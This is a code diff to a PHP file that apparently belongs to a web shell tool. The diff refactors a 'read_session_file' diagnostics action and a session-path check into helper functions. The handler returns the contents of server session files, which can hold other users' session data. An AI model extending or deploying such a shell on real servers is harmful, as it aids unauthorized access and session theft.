@@ -1,42 +1,55 @@
 <?php
+if (!function_exists('shells_x_realpath')) {
+    require_once __DIR__ . '/helpers.php';
+}
 // On-demand session file reader used by the Diagnostics UI. Returns JSON
 // with file contents (truncated) only if the path is a regular file and
 // lies under the resolved session.save_path or the webshell working dir.
 if (isset($_POST['action']) && $_POST['action'] === 'read_session_file') {
     header('Content-Type: application/json');
+    
     $path = $_POST['path'] ?? '';
     if (!is_string($path) || $path === '') {
         echo json_encode(['error' => 'missing path']);
         exit;
     }
-    $real = realpath($path);
-    if ($real === false || !is_file($real) || !is_readable($real)) {
-        echo json_encode(['error' => 'not found or not readable']);
+
+    $real = shells_x_realpath($path);
+    if ($real === null) {
+        echo json_encode(['error' => 'invalid path']);
         exit;
     }
-    // Resolve session.save_path (N;/path) fallback to sys_get_temp_dir()
+
+    if (!is_file($real)) {
+        echo json_encode(['error' => 'not a regular file']);
+        exit;
+    }
+
+    if (!is_readable($real)) {
+        echo json_encode(['error' => 'file not readable']);
+        exit;
+    }
+
     $sessRaw = ini_get('session.save_path') ?: '';
-    $sessResolved = $sessRaw === '' ? sys_get_temp_dir() : $sessRaw;
-    if (preg_match('/^\d+;(.*)$/', $sessResolved, $sm))
-        $sessResolved = $sm[1];
-    $sessResolved = rtrim($sessResolved, '/');
-    $root = realpath(getcwd() ?: '.');
-    $allowed = false;
-    if ($sessResolved !== '' && strpos($real, $sessResolved) === 0) $allowed = true;
-    if ($root !== false && strpos($real, $root) === 0) $allowed = true;
-    if (!$allowed) {
+    $sessResolved = shells_x_parse_session_save_path($sessRaw);
+    $root = shells_x_realpath(getcwd() ?: '.');
+    $allowedRoots = [];
+    if ($sessResolved !== '')
+        $allowedRoots[] = $sessResolved;
+    if ($root !== null)
+        $allowedRoots[] = $root;
+    if (!shells_x_is_path_allowed($real, $allowedRoots)) {
         echo json_encode(['error' => 'forbidden']);
         exit;
     }
-    $maxBytes = 20000;
-    $raw = @file_get_contents($real, false, null, 0, $maxBytes + 1);
-    if ($raw === false) {
-        echo json_encode(['error' => 'read failed']);
+
+    $fileResult = shells_x_read_file_truncated($real, 20000);
+    if (isset($fileResult['error'])) {
+        echo json_encode(['error' => $fileResult['error']]);
         exit;
     }
-    $trunc = (strlen($raw) > $maxBytes);
-    if ($trunc) $raw = substr($raw, 0, $maxBytes);
-    echo json_encode(['path' => $real, 'content' => $raw, 'truncated' => $trunc]);
+
+    echo json_encode(['path' => $real, 'content' => $fileResult['content'], 'truncated' => $fileResult['truncated']]);
     exit;
 }
 
@@ -741,15 +754,8 @@ if (isset($_POST['action']) && $_POST['action'] === 'diag') {
     // --- Session save path & session files ---
     $sessionInfo = [];
     $sessRaw = ini_get('session.save_path') ?: '';
-    $sessResolved = $sessRaw;
-    if ($sessResolved === '')
-        $sessResolved = sys_get_temp_dir();
-    // session.save_path can be in the form "N;/path" when using user-level
-    // session handlers; extract the path portion if present.
-    if (preg_match('/^\d+;(.*)$/', $sessResolved, $sm))
-        $sessResolved = $sm[1];
-    $sessResolved = rtrim($sessResolved, '/');
-    $sessDirExists = is_dir($sessResolved);
+    $sessResolved = shells_x_parse_session_save_path($sessRaw);
+    $sessDirExists = ($sessResolved !== null) && is_dir($sessResolved);
     $sessDirWritable = $sessDirExists && @is_writable($sessResolved);
     $sessionFiles = [];
     if ($sessDirExists) {
